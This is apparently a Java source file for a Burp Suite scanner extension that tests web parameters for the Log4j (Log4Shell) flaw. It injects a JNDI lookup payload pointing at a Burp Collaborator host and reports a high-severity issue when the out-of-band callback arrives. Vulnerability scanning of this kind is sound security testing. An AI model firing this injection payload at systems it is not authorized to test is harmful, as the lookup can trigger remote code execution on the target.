package BrianW.AKA.BigChan.PowerScanner;

import BrianW.AKA.BigChan.Tools.Global;
import BrianW.AKA.BigChan.Tools.utils;
import burp.*;

public class ScanLog4j extends Reporter {
    protected IBurpExtenderCallbacks callbacks;
    protected IExtensionHelpers helpers;

    public ScanLog4j(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        super(callbacks, helpers);
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    public IScanIssue doScanLog4j(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        byte[] resp = baseRequestResponse.getResponse();
        byte[] req = baseRequestResponse.getRequest();
        String baseName = insertionPoint.getInsertionPointName();
        byte insertionPointType = insertionPoint.getInsertionPointType();
        String baseValue = insertionPoint.getBaseValue();
        String collaboratorPayload = Global.interactionServer.getCollaboratorContext().generatePayload(true);
        callbacks.printOutput("generate Fastjson collaboratorPayload: " + collaboratorPayload);
        String payload = "${jndi:ldap://" + collaboratorPayload + "/" + utils.getRandomString(4) + "}";
        byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
        IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                reqEvil
        );
        pairEvil.setComment(payload);
        Global.interactionServer.addToPairList(collaboratorPayload,
                reporter(
                        "log4j RCE vulnerability found",
                        String.format("param: %s <br>" +
                                        "InsertionPointType: %s <br>" +
                                        "Payload: %s"
                                ,
                                baseName,
                                insertionPointType,
                                payload
                        ),
                        "High",
                        "Certain",
                        pairEvil
                )
        );
        return null;
    }
}
